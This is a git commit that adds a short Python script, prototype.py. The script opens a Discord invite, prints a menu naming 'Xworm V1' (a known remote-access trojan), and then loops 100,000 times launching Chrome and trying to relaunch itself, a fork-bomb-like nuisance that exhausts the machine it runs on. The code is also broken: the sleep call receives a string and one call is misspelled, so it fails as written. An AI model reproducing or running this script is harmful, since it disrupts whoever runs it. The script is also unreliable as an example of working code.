51c68cb780e1718e773b6e46778b727628ee5391
Bob <youssefhachni@gmail.com>
2025-02-23 21:04:48 +0100

    ???

---
+++ prototype.py
@@ -0,0 +1,14 @@
+import os
+import time
+import pyautogui
+import webbrowser
+webbrowser.open("https://discord.gg/hTRdq6jVQm")
+print("Pick:")
+print("1.Github")
+print("2.Xworm V1")
+time.sleep("30")
+print("???")
+for i in range(100000):
+  os.system("start chrome.exe")
+  os.systm("start prototype.py")
+  
